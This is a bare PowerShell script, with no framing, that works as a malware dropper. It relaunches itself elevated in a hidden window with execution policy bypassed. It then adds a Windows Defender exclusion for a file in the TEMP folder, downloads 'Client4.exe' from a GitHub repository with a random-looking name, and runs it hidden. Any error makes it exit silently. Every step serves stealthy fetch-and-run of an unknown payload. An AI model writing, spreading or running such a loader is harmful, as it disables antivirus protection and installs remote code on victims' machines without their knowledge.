param([string]$OriginalTemp=$env:TEMP)
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $expandedTemp = $env:TEMP
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`""
    (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe',$elevatedCommand,'','runas',0)
    exit
}

$output = Join-Path $OriginalTemp "cf2.exe"

try {
    # Create empty file first to establish path
    New-Item -Path $output -ItemType File -Force | Out-Null
    
    # Add exclusion to existing path
    Add-MpPreference -ExclusionPath $output -ErrorAction Stop
    
    # Perform download
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri 'https://github.com/ct7ybve7f387/tests/raw/main/Client4.exe' -OutFile $output -ErrorAction Stop
    
    # Verify and execute
    if (Test-Path $output) {
        Start-Process $output -WindowStyle Hidden
    }
}
catch { exit }
